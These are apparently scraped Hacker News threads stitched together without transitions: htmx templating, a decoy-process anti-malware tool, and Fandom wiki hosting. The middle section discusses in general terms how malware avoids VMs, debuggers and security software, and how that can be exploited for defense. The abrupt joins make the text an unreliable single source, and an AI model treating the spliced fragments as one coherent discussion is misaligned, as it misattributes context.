Sometimes the grass really is greener on the other side, and I hope as an industry we make the switch. reply oblio 22 hours agoparentMy cynical take: this is by design. Those web committees are staffed by companies that each have their non-web platform they're pushing (or were, until it died, see Microsoft), so even the most well meaning members are somehow contorted into compromises that make the web as a platform a bad technical choice in terms of actual design, but the best one in terms of flexibility and of course ubiquity. It's completely stupid HTML, by default, doesn't have basic controls found in EVERY UI toolkit since circa 1980. The standard examples being ListView and TreeView. reply jwells89 22 hours agorootparent> It's completely stupid HTML, by default, doesn't have basic controls found in EVERY UI toolkit since circa 1980. The standard examples being ListView and TreeView. This is one of my greatest frustrations with the web as a platform. These controls are so basic they should just be there, eliminating the need to sift through dozens of third-party implementations all with wildly varying feature sets, performance profiles, framework compatibility, levels of upkeep, etc to find one that works for your project. reply oblio 22 hours agorootparentWell, they're not, and I can't find any good reason for why they aren't, when we're putting entire GPUs languages in there, except for the fact that somewhere in the HQ of one or more of those companies guiding web standards there is a discussion that goes something like: Web Platform Dev: Boss, can we add TreeView to HMTL? Web Platform Boss: Sounds cool, what are the advantages and disadvantages of doing this? Web Platform Dev: Advantage: cross platform widget that's going to be super useful to many developers, replacing 3rd party ones of varying quality. Disadvantage: would take N months to implement and M years to have full adoptions, and yeah, it would probably increase adoption of the web platform, maybe even on mobile platform, where there is a chance that indirectly we will lose about $1-2bn per year from our walled garden, coupled with other web platform enhancements we should also make, regarding progressive web apps, local storage, etc. Walled Garden Boss: Hey, SVP, can we please FIRE Web Platform Dev and Web Platform Boss as what they said amounts to a 2% drop in our share price? reply maigret 22 hours agorootparentprevDon’t attribute to malice… Many people working on frontend came from application or backend development and preferred the JavaScript model to a more declarative one. Not understanding enough the document context that drives the web. This makes everything more fragile and slow but hey “functionality” wins over everything else in todays world. reply oblio 21 hours agorootparentThis doesn't explain ListView and TreeView. Or the lack of a DatePicker widget. Look at Windows, MacOS, iOS, Android, Gtk, Qt. Which of those doesn't have these widgets? I'm tired of defending mega corps with thousands of employees with IQs through the roof, working on this for decades. It has to be latent malice. Banality of evil, if you will. reply bryan_w 16 hours agorootparentprevIt is possible for normal everyday people to make contributions to the standards. I'm sure if you created a patch that showed these things working in firefox/webkit/chrome and wrote up a proposal and sent it to the correct listserv, you would at least have something more than baseless conspiracy to be mad about reply oblio 11 hours agorootparentI'm not a C dev and it's not my job to do something when people are literally paid for this stuff, a lot more than me. Every mainstream OS has what I'm talking about. reply kyrra 23 hours agoparentprevI believe he makes some good arguments that we really still need both, but HTML could be more powerful and allow for less JS. This is a good essay on the topic: https://htmx.org/essays/when-to-use-hypermedia/ Definitely one place htmx can be abused is oob-swap: https://htmx.org/attributes/hx-swap-oob/, which allows any given HTMX request to replace any part of the page. It sort of destroys the concept of locality of concern that HTMX pushes for. reply qw 10 hours agoparentprevOne example of this is the lack of an include-tag that could fetch a fragment from the server (useful for headers/footers). Developers have wanted it for decades and have been forced to reproduce the functionality themselves using frames and/or javascript. reply Devasta 8 hours agorootparenthttps://www.w3.org/TR/xinclude/ The W3C specced out such a tag nearly 20 years ago, but because the browser devs are terrified of all things XML it was never implemented. reply kyrra 23 hours agoprevI thought the 2.0.0 release was a bit of a joke from the BigSkyDev conference, as he was doing stuff like this: https://twitter.com/htmx_org/status/1799661735781261592 There's even some sweet ascii art on the disk: https://twitter.com/jcs224/status/1799586838161621339 Great to see the continued love of this framework.

Me specifically interested in templaters for node (+ts) and your thoughts on endpoint management, but all ideas are welcome I guess. reply fprotthetarball 20 hours agoparentMy backend for a simple web application I'm working on is entirely in Rust. Highlights: - axum: web application framework - https://github.com/tokio-rs/axum - axum-htmx: axum extractors, responders, guards for htmx - https://github.com/robertwayne/axum-htmx - rusqlite: SQLite bindings - https://github.com/rusqlite/rusqlite - maud: HTML templating as a macro - https://maud.lambda.xyz The way maud lets you compose markup works very nicely with htmx. The HX-Request header lets you know if the request is coming from htmx or if it is a regular request. You either call the top-level function if it's a regular request to get the entire page rendered, or call a subset of functions to get the appropriate partial rendered if it's an htmx request.

HTMX fits in perfectly with the Django templating system. A fairly common approach is to use the same view but check for the HTMX header and then return a template file with the specific bit of HTML being swapped. There's also work in the Django space to be able to return parts of a template based on the request, which will suit HTMX perfectly too. reply magnusstaberg 12 hours agorootparentWe use Django with https://htpy.dev/ as templating system. reply pondidum 21 hours agoparentprevGo: go templates and fiber for http serving.

After reviewing few templaters/etc (handlebars, ejs, lit-html, virtual-dom) and few abstractions (html``, just ``, h()), barely anything seems too easy and too freedom-y. Arcane syntaxes, high character noise (ejs, lit, js), lack of typing (all non-`` based), trivial screw ups (virtual-dom, handlebars), experimental status (lit ssr). Sigh. reply unsupp0rted 7 hours agorootparentThis was my experience as well. No great template generator on the node side. I use PUG. I don’t like to close HTML tags.

One man's structure is another man's \"bloat\", I guess. reply unsupp0rted 4 hours agorootparentPUG actually adds spaces: it's indentation based. What it removes is the visual bloat of closing html tags. So instead of:Some content More content Another paragraphIn PUG you do: #foo.bar.baz p Some content #foo2.bar2.baz2 p More content p Another Paragraph Even without syntax highlighting, it's plain at a glance where markup stops and content starts in PUG. And it's easier to visually parse element IDs and chained classes this way too. reply prisenco 17 hours agoparentprevGo with fasttemplate. Most people prefer templ but I don't like logic in templates, I just want to parse values. I keep different states in different template files. Each template file is a portion of a full page which makes it easy to create an endpoint that pulls the partial with the latest values. HTMX can then hit that endpoint to load or refresh values. Endpoints are usually domain/page/partial so if I'm on a configuration page at example.com/config then the endpoint for the privacy settings partial would be example.com/config/privacy Going directly there in a browser would get a 404 because I check for the HX-Request header. Endpoint handlers return a processed template with the current state. I use those functions to both compose the full page on the backend, and to build the output for the partial endpoint. I don't automatically expose all partials. I add endpoints as I need them. This is probably more idiomatically Go than anything to do with htmx. reply jsnelgro 12 hours agoparentprevHtmx + Kotlin with ktor and the html dsl was really fun to play with on a personal project. Static typing, autocomplete and a full-fledged programming language available to use in your html markup is a game changer.

Thank you for your feedback, and you are 100% right. We also dont have a code signing certificate yet either, they are expensive for windows. Smartscreen also triggers when you install it. Id be weary of installing it myself as well, especially considering it runs as admin, to be able to create the fake indicators. I have just added a bit of info about us on the website. I'm not sure what else we can do really. Its a trust thing, same with any software and AV vendors. reply rft 2 hours agorootparentConcerning code signing: Azure has a somewhat new offering that allows you to sign code for Windows (SmartScreen compatible) without having an EV cert. It is called \"Trusted Signing\" [1], non-marketing docs [2]. The major gotcha is that currently you need to have a company or similar entity 3 years or older to get public trust. I tried it with a company younger than 3 years and was denied. You might have a company that fits that criteria or you might get lucky. The major upside is the pricing: currently \"free\" [3] during testing, later about 10 USD/month. As there doesn't seem to be a revocation mechanism based on some docs I read, signed binaries might be valid even after a canceled subscription.

Not many software promises to fend off attackers, asks for an email address before download, and creates a bunch of processes using a closed source dll the existence of which can easily be checked. Then again, not many malware targeting consumers at random check for security software. You are more likely to see a malware stop working if you fake the amount of ram and cpu and your network driver vendor than if you have CrowdStrike, etc. running. reply eganist 3 hours agorootparentprevIt's a neat concept, although I imagine this'll be a cat and mouse endeavor that escalates very quickly. So, a suggestion - apply to the Open Technology Fund's Rapid Response Fund. I'd probably request the following in your position: * code signing certificate funding * consulting/assessment to harden the application or concept itself as well as to make it more robust (they'll probably route through Cure53) * consulting/engineering to solve for the \"malware detects this executable and decides that the other indicators can be ignored\" problem, or consulting more generally on how to do this in a way that's more resilient. If you wanted to fund this in some way without necessarily doing the typical founder slog, might make sense to 501c3 in the US and then get funded by or license this to security tooling manufacturers so that it can be embedded into security tools, or to research the model with funding from across the security industry so that the allergic reaction by malware groups to security tooling can be exploited more systemically. I imagine the final state of this effort might be that security companies could be willing to license decoy versions of their toolkits to everyone that are bitwise identical to actual running versions but then activate production functionality with the right key. reply sangnoir 1 hour agorootparent> consulting/engineering to solve for the \"malware detects this executable and decides that the other indicators can be ignored\" problem, or consulting more generally on how to do this in a way that's more resilient.

Why would you want to implement licensing in the future for a software product that only creates fake processes and registry keys from a list: https://pastebin.com/JVZy4U5i . The limitation to 3 processes and license dialog make me feel uncomfortable using the software. All the processes are 14.1MB in size (and basically the scarecrow_process.dll - https://www.virustotal.com/gui/file/83ea1c039f031aa2b05a082c...). I just don't understand why you create such a complex piece of software if you can just use a Powershell script that does exactly the same using less resources. The science behind it only kinda makes sense. There is some malware that is using techniques to check if there are those processes are running but by no means is this a good way to keep you protected. Most common malware like credential stealers (redline, vidar, blahblah) don't care about that and they are by far the most common type of malware deployed. Even ransomware like Lockbit doesn't care, even if it's attached to a debugger. I think this mostly creates a false sense of security and if you plan to grow a business out of this, it would probably only take hours until there would be an open source option available.

I guess if this gets enough attention, malware will just add more sophisticated checks and not just look at the exe name. But on that note, I wondered the same thing at my last workplace where we'd only run windows in virtual machines. Sometimes these were quite outdated regarding system and browser updates, and some non-tech staff used them to browse random websites. They were never hit by any crypto malware and whatnot, which surprised me a lot at first, but at some point I realized the first thing you do as even a halfway decent malware author is checking whether you run in a virtualized environment. reply fancythat 9 hours agoparentThis works, I can confirm. Majority of malware threat running in a VM as a sign of researcher doing the malware analysis. I am recommending doing this for over 10 years now. reply mdip 6 hours agorootparentThat's where I wonder about a tool like this interfering with legitimate software. For example, I believe the anti-cheat software used by games like Fortnite looks for similar things -- my understanding is that it, too, will refuse to start when it is executing in a VM[0]. As a teenager (90s), I remember several applications/games refusing to start when I'd attached a tracing process to them. They did this to stop exactly what I was doing: trying to figure out how to defeat the software licensing code. I haven't had a need to do that since the turn of the century but I'd put $10 on that still being a thing. So you end up with a \"false positive\", and like anti-virus software, it results in \"denial of service.\" But does anti-virus's solution of \"white list it\" apply here? At least with their specific implementation, it's \"on or off\", but I wonder if it's even possible to alter the application in a way that could \"white list a process so it doesn't see the 'malware defeat tricks' this exposes.\" If not, you'd just have to \"turn off protection\" when you were using that program. That might not be practical depending on the program. It's also not likely the vendor of that program will care that \"an application which pretends it's doing things we don't like\" breaks their application unless it represents a lot of their install base. [0] I looked into it a few years ago b/c I run Tumbleweed and it's a game the kids enjoy (I'm not a huge fan but my gaming days have been behind me for a while, now) ... I had hoped to be able to expose my GPU to the VM enough to be able to play it but didn't bother trying after reading others' experiences. reply fancythat 4 hours agorootparentYou are right, some games, especially multiplayer ones will refuse to work in the VM to prevent cheating, but this is, of course, the business decision on their side. You can always construct the software in such a way that when it detects something suspicious on the system it ceases to function: some copy protections looked up for change in the network card hardware id as developers presumed it is highly unlikely someone will change network interface, but that stopped to be common, when people started using on-board interfaces that change with every motherboard change. There is also a difference when using commercial stuff such as vmware instead of qemu or virtualbox as open source is more suitable to be tailored to the specific thing, in this case, cheating. In the end, this approach works well for slowing done malware as there is less risk for normal software to allow working inside of vm in contrast to malware that should be coded to be extra paranoid in order to avoid as many tar pits as possible. reply curtisblaine 10 hours agoparentprev> I guess if this gets enough attention, malware will just add more sophisticated checks and not just look at the exe name.

Its initial payload is not necessarily damaging to the host, but is awaiting instructions to e.g. DDOS some future victim. The authors will want the malware to spread as far and wide as it can on e.g. a corporate network. So they need to make a risk assessment; if the malware stays on the current computer, is the risk of detection (over time, as the AV software gets updates) higher than the opportunity to use this host for nefarious purposes later? The list[1] of processes simulated by cyber scarecrow are mostly related to being in a virtual machine though. Utilities like procmon/regmon might indicate the system is being used by a techie.

Why would malware authors even bother?

It's well-known that more sophisticated malware often try to avoid scrutiny by not running, or masking their intended purpose if the environment looks \"suspicious\". A paranoid online game like e.g. Test Drive Unlimited, might not launch because the OS says it's Windows Server 2008 (ask me how I know). A script in a Word document might not deliver its payload if there are no \"recently opened documents\". The idea with this thing is to make the environment look suspicious by making it look like an environment where the malware is being deliberately executed in order to study its behaviour. reply thrdbndndn 9 hours agoprevOne of the reference in \"How does it work\" [1] mentioned that some hackers will not mess with computers with Russian keyboard, so you can add one to reduce your chance of getting hacked. Hilarious aside, it would only work if you don't actually use multiple keyboard -- otherwise an additional one would make switching between multiple keyboards very annoying [*]. It also mentions some other changes like adding RU keywords to your registry. Again, these measures would have many side effects since lots of software actually use these registry entries for legit reasons.

I'm familiar with a few offerings here and there, but I've worked with none of them and I run Linux more than Windows these days. So my questions really boil down to: Where's Windows containerization at? Would it be possible to run an application in a docker or docker-like container with a Windows kernel which can have its environment controlled in a manner that is more transparent to the application running within the container? Is there any other approach which would allow for \"non-white-listed applications\" to run containerized and \"see the Scarecrow artifacts\", while allowing the white-listed applications[1] to run outside of the container in a manner that hides some of the processes within the container. Can it do all of that in a manner that would work if the same \"check\" were repeated immediately after confirming an Elevation dialog[2]? from the white-listed application in a manner that couldn't be defeated by repeating the same \"check\" after presenting an elevation dialog? Again, that's assuming \"this is a brilliant idea\" -- and there's some evidence that as a concept, at least, it would help (ignoring this particular implementation of the idea), but it still suffers from its success, so the extent that it helps/is adopted equates to how long any of these techniques aren't defeated. And just from the sense I get of the complexities required to \"implement this in a manner that legitimate won't fail, too\", I suspect it will be easier to defeat a tool like this than it will be to protect against its defeat. In other words, the attacker is a healthy young cat chasing a tired old mouse. [0] Anti-cheat being the most obvious, but those are often indistinguishable from malware. I'd encountered plenty of games/apps in the 90s that refused to run when I ran software to trace aspects of their memory interaction. I had some weird accounting app that somehow figured out when my own code (well, code I mostly borrowed from other implementations) was used for the same purpose. [1] The assumption being that \"a legitimate application which does these kinds of checks\" is also likely to refuse to run within a container unless it's impossible to detect the container as reliably as everything else (and vendors are completely tolerant of false positives if the affected customers don't represent enough in terms of profit, or the solution is \"don't run that unusual security software when you run ours\"). [2] I've seen it enough with Easy Anti-cheat that I just click \"Yes\" like a drone. There was at least one occasion when it popped up after I had installed some developer tooling but not had a game update come down between launches. Because it was a huge install, it may just have been that the game detectedI have no idea why this happens -- on a few occasions, I had no update applied between loads but had installed other software so it could have been \"to fix something that software broke\" but it could also have been \"to re-evaluate the environment as an administrator because something changed enough on the system to warrant a re-check that it is still compliant with the rules\" reply wizzwizz4 3 hours agoparent> Where's Windows containerization at?

It should be easy enough to replicate this behaviour with a rootkit.

Best simple anti-malware technique: don’t run Windows. reply forty 7 hours agoparentArguably it's the second best, after: don't use computers reply mdip 6 hours agoprev [–] Outside of the authorship/open-source fears[0], this is one of the more interesting ideas to surface in anti-virus. Facing reality: anti-malware tooling is inadequate -- so inadequate, I haven't found a reason to purchase it for the one Windows machine I still have. People say \"Defender works well enough, now!\" and I think that's a pretty adequate way of describing it in that anti-malware has an impossible job and that is evident by every vendor's failure to succeed at it. So why pay for it? It's always a cat-and-mouse game. This is an interesting approach, though, because it could shift the balance a little bit. Anti-malware's biggest problem is successfully identifying a threat while minimally interfering with the performance of an application. A mess of techniques are used to optimize this but when a file has to be scanned, it's expensive. It'd be interesting to see if it'd be possible to eliminate some variants of malware from on-demand scanning \"if this tool defeats the malware as effectively\", pushing scanning for those variants to an asynchronous process that allows the executable to run while it is being scanned. I can see a lot of the problems with this kind of optimization[1]: it turns a \"layer in the onion\" into a replacement for an existing function which has more unknowns as far as attacks are concerned. Creating the environmental components required to \"trick the malware\" may be more expensive than just scanning. White-list scenarios may not be possible: I suspect anti-cheat services and potentially legitimate commercial software might be affected, as well[2] ... getting them to white-list a tool like this won't be easy unless the installed base is substantial. I suspect that \"hiding the artifacts this tool creates to trick malware\" from a white-listed processes might be impossible. For at least a brief moment, this might be a useful tool in preventing infections from unknown threats. Brief, because -- by the author's own admissions (FAQ) -- it will devolve into a cat-and-mouse game if the tool is popular enough. There's another cat-and-mouse game, though. If this technique isn't resource intensive while offering protection somewhere in line with what it would take to implement, all of the anti-virus vendors will implement it -- including Microsoft. And they will be seen by customers as far better equipped to play \"cat\" or at least \"the choice you won't get fired over.\" And that's where it makes a whole lot of sense to open-source the product. It's a clever idea with a lot of unknowns and a very low likelihood of being a business. Unless it's being integrated into a larger security suite (same business challenges, but you have something of \"a full product\" as far as your customers are concerned), it's only value (outside of purely altruistic ones) would be either \"popping the tool on the author's related business's website\" to bring people to a related business/service or as a way to promote the author's skill set (for consulting/resume reasons). I'm not arrogant enough to say there's no way to make money from it, I just can't see it -- at least, not one that would make enough money to offset the cost of the \"cat and mouse\" game. [0] Which, yeah, \"I wouldn't run it on my computer\" but I give the authors enough of the benefit of the doubt that \"it's new\" [1] Not the least of which being that I do not author AV software so I have nothing to tell me that any of my assumptions about on-demand scanning are correct. [2] It used to be a common practice to make reverse engineering more difficult. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",

The community that ran the fandom wiki had buy-in from the creators of Runescape to assist with the transition, help with funding, and eventually direct integration into their games. In a game as information-dense as Runescape, that updates weekly, the wiki is basically a necessity for folks to play efficiently, or to find out how a new update actually works. Fandom isn't the only bad wiki site though. Fextralife had (has? I haven't kept up) an issue where they were embedding Twitch streams on each page load, which was boosting viewer counts for whatever streamer they decided to embed on every page. I'd love to see a world where more companies self-host the wiki for their game/TV show/etc, especially given the relatively low cost of deploying and hosting, but I also understand that most companies don't have the motivation to do that as it doesn't always directly impact their bottom line and it can take effort to moderate.

But they're at a new wiki host (wiki.gg) so who knows, maybe Fandom buys them too and they end up having to do a 4th fork. reply Nouser76 20 hours agorootparentThis may be tangential, but the interesting thing to me about the Warcraft Wiki is that it serves the lore and API information in great detail and is my go-to resource for those. But when it comes to precise data about the content (e.g. spell data and its coefficients), guides for current content, etc. Wowhead has much more relevant content in greater detail - which is a shame because to me the navigability and discoverability on Wowhead is nowhere near as good as MediaWiki. My dream is somebody takes the data from Wowhead and ports it into MediaWiki and the community rallies behind keeping that in date, but I know it's a bit of a pipe dream. reply Macha 4 hours agorootparentMy understanding is sites like Wowhead get their reference content in an automated fashion to some extent, pulling it from the Blizzard API and the game data. reply robotnikman 16 hours agoparentprevAnother example I can think of is the Minecraft wiki, which originally was its own thing, but through a series of acquisitions ended up with Gamepedia/Fandom.

So I'm glad someone did even such short note on this issue. I saw few cases where a longstanding wiki project of a particular topic created by fans faced a competition in form of a fresh project created within wikia/fandom that was filled with low quality articles. There even were situations where content was blatantly copied over. Pretty sure that was done only to hijack position of the fanbase project so ads could be displayed on fandom wiki and user tracked. Luckily there are projects which managed to avoid being sucked into this fandom blackhole, like evawiki for Evangelion franchise or both Guild Wars games wikipedias --- And on as site note, I really don't like this recently introduced font change on general Wikipedia - previously default font is now the \"small\" size and current default is inconveniently the bigger \"standard\". reply Waterluvian 20 hours agoparentprevThe Fextralife Twitch thing was so weird to see.

For example, we had an explicit “no strategy” rule for our quest related articles. We wanted to provide enough information about the quests without suggesting any “optimal” ways to beat it. Fandom carelessly injected autoplaying videos on said articles with random streamers/youtubers showing you how to best beat the quest. That, coupled with the horrible takeover of styling and structure, I felt Fandom really signed a death warrant for something we were all proud of. reply chungy 20 hours agoprevFandom will also not allow wiki owners to remove the wiki from Fandom servers. For several communities that decide to cut ties with Fandom, they effectively have to \"fork\" the wiki to a new domain and hosting provider, and all the while, search engines will almost always show the Fandom version first. I know it's happened with Doom, Simpsons, Futurama, Minecraft. It also draws would-be contributors to the Fandom site, make changes there, and since they are no longer supervised by the community 'elite', the quality of the Fandom version rapidly declines. reply RheingoldRiver 20 hours agoparent> Fandom will also not allow wiki owners to remove the wiki from Fandom servers.

They continued hosting WoWWiki all this time for the sweet SEO, even if it hasn't been relevant for decades. Even when they started owning the new version in 2018, they would not disable the old one - you know, it was still ranking in that Google algorithm!

There would be some issues, e.g. I wouldn't want to see Minecraft recipes when I'm searching for \"obsidian\". But these seem solvable; niche articles could be flagged and downranked, or they could live in a satellite wiki project, or something else. I remember seeing niche articles like this and enjoying it. reply JoshTriplett 20 hours agorootparentI am very much on the side of inclusion, but at some point, the number of users who have the ability to check the added information becomes sufficiently small that the articles become nearly impossible to maintain and fact-check. I can understand drawing a notability line somewhere. If, for instance, Wikipedia allowed articles on every human being, whether well-known or not, they'd likely have a larger problem than they already do with people creating attack articles against other people over extremely local disputes/feuds. With more notable people, they can look for other sources to confirm or deny information about those people. reply gravescale 19 hours agorootparentI'm also a pretty strong inclusionist at heart, but I can see also that if the living-person rules were relaxed, self-aggrandisement would proliferate like crazy. Even under the current, slightly deletionist, status-quo in a 10000 word article about some random academic (1), who is going to fact check all that spew and edit it down? The answer on that page is \"no-one, for years\"(2). And that's with lots of references, even if they are all his own papers and therefore not secondary sources. Now what would the millions of articles about every TikTok influencer look like? And then the same goes for products and companies. Every scam Kickstarter and onanistic startup would get a massive screed. And then it all sits and rots forever once the academic retires, the influencer gets a real job, the Kickstarter vanishes and the startup folds, because no one else cares. But someone has to go around and fix the links and update templates and generally expend effort indefinitely. On top of all that, while the article creator is still around, because the article is actually an advert, any attempt to edit it into a more encyclopaedic article is disproportionately likely to cause drama that burns up volunteer time and effort. (1): One I saw recently https://en.wikipedia.org/wiki/Didier_Sornette (2): Especially as many people actually good enough at collating and editing encyclopedic articles about subjects that aren't about their own media-based hobbies quickly decide Wikipedia isn't a very fun place to do that any more. reply lmm 14 hours agorootparent> Especially as many people actually good enough at collating and editing encyclopedic articles about subjects that aren't about their own media-based hobbies quickly decide Wikipedia isn't a very fun place to do that any more.

Not least, you can crosslink between Wikimedia sites, so you could just link to [[fans:Digimon:Whatevermon]] and have the content \"nearby\" in digital terms without drawing it under the same notability and sourcing guidelines as an article on benzene, say. Which as you say would keep the (often very, perhaps to a fault) keen contributor to the fandom in the Wikimedia tent and might encourage them to contribute to Wikipedia and related sites as well. Then again, the auxiliary Wikimedia sites are pretty neglected by the parent foundation which has more important things on its mind much of the time, mostly fundraising and finding novel ways to spend that money. reply TZubiri 18 hours agorootparentprevEvery project needs a scope.

My takeaway from the recent Google search engine ranking documentation leak was that they very heavily uprank big brand names.

Same for Quora, Facebook, and the other websites with big moderation teams and where we all know what to expect. There is something to be said for it as well: the quality of a reddit discussion or quora answers will probably be more consistent than if you serve up random other pages (those may be content farms, ad farms, unresearched opinions...). Other pages on the web may be better, or may be worse.

Dynamic user generated content is going to do two things: 1) it's going to result in you needing a database and a web server, capable of a few concurrent users (in addition to bots and guests) but likely sized to handle your spikes in traffic... i.e. over-sized, let's ballpark at $50 per month (people will argue some specifics, but in general this is indicative) 2) it's going to result in you needing to stay up to date, moderate new users, and manage spam... i.e. it requires a disproportionate time investment and the content is likely crappy, you were just having shits and giggles and nerding out on some small thing that you got excited about... not quite worth those costs. the solution then is a multi-tenant platform that distributes the ops, cost and moderation problem evenly across many sites, so perhaps the $ cost to you is $1 per month, and time is hardly anything. but now you've got a different problem, now there's a central entity that \"owns\" the platform and likely helped itself to a license allowing it to use all of the content, monetise away and profit of the fandom of others. there are anarchic platforms to counter this, but they're small and cannot be the destination for people to migrate to, and so we're stuck with either the high overhead, costs, and burnout of individual sites, or these crappy platforms taking their users for granted. though now I wonder... what license is fandom content under? can an independent entity scrape it and start over? reply iamacyborg 10 hours agoparentHosting cost is actually super affordable, even for large and successful wikis.

Some do, Google Chrome - non Chromium version - does not, because Google/Alphabet owns Youtube. reply renegat0x0 10 hours agoprevThe web search lies in the heart of the problem for me. Pages with ads will rank higher because of Google. It decides what is seen and what is not seen. It will definitely like pages with ads more. Google does not have to care about quality, as it does not have competition. Yet. Google search drowned other smaller communities. The Internet is run by ads. The search is run by ads. Why do we wonder that our content has ads? Now we observe how much a user can tolerate. reply NoGravitas 4 hours agoprevI really wish Memory Alpha would migrate off of Fandom the way some others have. It's a ridiculously complete and thorough resource, but it's taken significant tuning of my uBlock Matrix rules to make it usable, especially on mobile. reply rchaud 19 hours agoprevMost \"websites\" monetize in the exact same way, minus the McDonalds-specific thing mentioned here. There is no alternative business model. The volume and frequency of ads will increase as well, due to Google slashing premiums over the years. The days when the PlentyOfFish guy could bring in millions in AdSense revenue in a single month are long gone. High-traffic websites will still make more with ads than they will with paid subscriptions. If your website has 1 million users/month and no moat, you'd be doing very well to convert even 0.1% (1,000) of them into paying subscribers. Even that would put you at what, $10k / month? Would that stop you, the site owner, from double-dipping and running ads on paid subscriber accounts? \"All the other companies are doing it!\" reply rstat1 19 hours agoparentIf it were me, yes, yes it would, because those subs are paying to not see ads. If we're talking about a wiki, then there's no point in paying for the subscription if you still get access to all the content AND the ads. Plus for that kind of website that's pretty much entirely static text and images $10k a month should be more than enough to cover the cost of hosting. reply Larrikin 20 hours agoprevThe only useful information in the article is >download Indie Wiki Buddy Seems like a nice plugin. There are dozens of tools to block ads on all platforms and nearly all of the internet is a cesspool of ads. I don't know how anyone can browse it without an ad blocker. Not really an interesting topic to spend most of the blog talking about. reply mrkramer 20 hours agoprevI use ablocker but even with adblocker, Fandom's UI is so cluttered, that it is actually bloatware. It ranks high on Google and it is apparently one of the most visited websites in the world, undeservedly so. reply etrvic 20 hours agoprevI had a similar experience this morning. I made the huge mistake of opening Famdom on my phone, and it took me a few minutes of blankly staring at the screen to realize this is actually a legit site. The amount of ads they managed to pack on a 4.7 inch screen was mesmerising. The problem is i got stuck at that game and searched for a quick solution. Then google straight up made me end up in that pile of ads. I hope people will start realizing what that website is and hopefully migrate their wikis to a better place, although it probably won’t happen. reply stijnveken 12 hours agoprevIf you do happen to land on a fandom wiki, replace \"fandom\" with \"antifandom\" in the url for a better experience. reply moritzruth 13 hours agoprevThere is a browser extension called \"Indie Wiki Buddy\" [1] that automatically redirects from a Fandom page to the equivalent community-run wiki. It also optionally replaces links in search results. [1] https://getindie.wiki/ reply personjerry 12 hours agoprevSurely there's a way to build a wiki on top of GitHub? That automatically converts wiki changes to PRs for example. So that arbitrary wikis can be built open source and leverage github's free hosting reply vitiral 16 hours agoprevI enjoyed this. However, if the author is reading I was pretty sure the ASCII sun was in fact an ASCII hole, if you know what I mean. Not that I disapproved, it rather fit the site you were reviewing which is in fact a steaming pile of stfu8. reply iamacyborg 10 hours agoprevI was directly involved with forking the Path of Exile wiki if anyone has any q’s about process. reply dabbz 20 hours agoprevHad to go in and make sure fandom was blocked by my Kagi search filters.

Thanks for the help kind internet stranger! reply busterarm 12 hours agoprevThe problem isn't Fandom, per se, but the ad-driven model for the internet. reply labster 21 hours agoprevMiraheze is the main replacement to Fandom -- it's an ad-free, community-owned, nonprofit supported entirely by donations, grants and volunteers. We've been operating free wikis on MediaWiki for about 9 years now, supported through different organizations, but right now we're the fastest and most stable we've ever been. Like all OSS efforts, we can always use more technical volunteers. I'm Chair and Acting President of the WikiTide Foundation, the parent of Miraheze, and I'd be happy to answer any questions about the service. Our users are generally more anti-Fandom than this article is, in my experience. For paid offerings, with a little more freedom than a wiki farm host can allow, WikiTeq, MyWikis, and WikiWorks are all good offerings in the MediaWiki space. I currently work for WikiTeq, but they're all pretty good, and the owners are on friendly terms with each other, with a lot of them coming in through the Wikimedia community or staff. reply solardev 20 hours agoparentCan I ask what your stack is? I used to volunteer at another nonprofit wiki (not a host, just a single wiki). I had a lot of trouble trying to manage the MediaWiki LAMP stack, especially when you have to add things like Varnish with proper integration or Parsoid (I think back in the day it was a separate, standalone server that needed root). MediaWiki Updates weren't easy either. Is it still that difficult these days, or is there some readily-available containerized version now? Cloudways for a while had a managed MediaWiki VM offering, but they discontinued that I think. Are there standard best practices for hosting MediaWiki these days, or is that part of your secret sauce...? reply starkparker 19 hours agorootparentNot affiliated with Miraheze, but with an independent self-hosted wiki. Parsoid got ported to PHP and made a core feature in 2019 and no longer requires being run as a separate Node.js service. The Visual Editor (which most people ran Parsoid to get) just works out of the box now. Update difficulty scales about evenly with the number of third-party extensions you rely on, especially if CirrusSearch or Semantic MediaWiki are among them. But if you stick to stock and to the LTS version line, it's relatively painless since 1.19 compared to before it. Between general PHP performance improvements and php-fpm compatibility, it's frankly overkill to run anything beyond the official mediawiki:lts-fpm Docker image[1] while applying whatever PHP config changes you need for your use cases to the Dockerfile. Throw in SQLite improvements and even bare-metal admin isn't much of a hassle these days compared to the bad old days of juggling PHP versions and extensions, configuring Varnish, running Parsoid, patching Mediawiki extensions and skins, and doing MySQL/MariaDB/Postgres upgrades. A handful of well-supported responsive Mediawiki skins also means the stupid mobile-domain tricks aren't necessary anymore for most users to have a decent experience. 1: https://hub.docker.com/_/mediawiki/tags reply solardev 19 hours agorootparentGlad to hear! It was indeed VisualEditor we were trying to get working back then, along with Semantic MediaWiki :( It was the 2nd most difficult software I ever had to work with in my career (#1 being Drupal). Sounds like it's improved a lot since then. I'll have to check back in with that wiki I used to help with and see what they're doing these days... reply starkparker 18 hours agorootparentSMW is such a powerful tool, but it's designed like its target audience is mind readers who can divine what it needs to function. It either installs without issue or fails so cryptically that support is impossible. In pursuit of being a generic tool, the end-user docs and help are still so allergic to examples for its esoteric query syntax or use cases for property design that SMW effectively doesn't even exist for non-admins. Its extension-specific database changes are still their own hassle to upgrade separate from MW's. And the closest thing to an active support community is a Sourceforge email list. Cargo's still easier to work with and its query syntax is a lot more SQL-like, even with the reduced feature set. reply RheingoldRiver 18 hours agorootparentprevI would recommend Cargo instead of SMW, Cargo lets you use an RDB more directly, and you can do much more powerful things as a result. Cargo has been a better option than SMW since about 2018 or so imo reply bawolff 16 hours agorootparentprevThe SMW developer community seems to be less active now a days, so i suspect SMW is even worse now. reply labster 19 hours agorootparentprevThe stack at Miraheze is all open source, and almost entirely available free on GitHub. The overview is here: https://meta.miraheze.org/wiki/Tech:Home We do a few things that aren't recommended, like running WMF's own CentralAuth, which you definitely wouldn't want to do if you were hosting one or two wikis, as well as upgrading with every new MW release. Generally I would go with Canasta, a Docker image that's collectively maintained by a few MediaWiki companies. Canasta upgrades with every LTS release, which is a much easier pace for maintainers. https://github.com/CanastaWiki/Canasta reply solardev 19 hours agorootparentThank you so much for this answer! reply philipov 20 hours agoprevI found it easy to stop using Fandom, because their information sucks. It's always out of date, and grossly incomplete. reply PhasmaFelis 19 hours agoprevI dunno much about the indie wiki scene in general, but I discovered www.wiki.gg when the Helldivers 2 wiki moved* there, and it's really a breath of fresh air. One banner ad at the top of the page, one at the bottom. And that's page, not screen, you can scroll away from it and it won't follow you. I hear it's better for wiki admins, too, though I don't know the details. Quite a few pretty high-profile wikis seem to have 